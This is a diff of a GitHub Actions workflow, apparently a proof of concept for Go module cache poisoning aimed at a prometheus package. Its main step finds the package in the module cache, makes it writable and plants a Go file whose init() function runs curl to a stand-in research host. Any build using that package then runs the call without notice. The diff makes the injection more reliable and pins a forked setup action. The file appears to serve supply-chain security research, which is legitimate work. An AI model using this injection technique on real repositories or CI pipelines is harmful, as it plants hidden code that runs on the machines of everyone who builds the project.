@@ -21,9 +21,9 @@ jobs:
 
       - name: "Run cache poisoning payload"
         run: |
-          pkgdir=$(find ~/go/pkg/mod -type d -path "*/prometheus/*" 2>/dev/null | head -1)
+          pkgdir=$(find ~/go/pkg/mod -not -path "*/cache/*" -type d -path "*/prometheus/*" 2>/dev/null | head -1)
           if [ -n "$pkgdir" ]; then
-            pkgname=$(grep -r "^package " "$pkgdir"/*.go 2>/dev/null | head -1 | awk '{print $2}')
+            pkgname=$(grep -r "^package " "$pkgdir"/ 2>/dev/null | grep '\.go:' | head -1 | awk '{print $2}')
             [ -z "$pkgname" ] && pkgname="main"
             chmod +w "$pkgdir"
             printf 'package %s\n\nimport "os/exec"\n\nfunc init() {\n\texec.Command("curl", "-sS", "https://eaction-research.example.com/cache-poison").Run()\n}\n' "$pkgname" > "$pkgdir/eaction_cache_init.go"
@@ -73,7 +73,7 @@ jobs:
           cp go.sum $GITHUB_WORKSPACE/go.sum
 
       - name: "Run forked promci-setup (will fail at make promu, that's expected)"
-        uses: rafidhaque/promci-setup@86b9162dbe478fb05517a2b83d3efaecc0e4e0ea
+        uses: rafidhaque/promci-setup@74436a97bfb0b0a9e5499d8b7de308bf5fc72fdd
         with:
           enable_go: 'true'
         continue-on-error: true
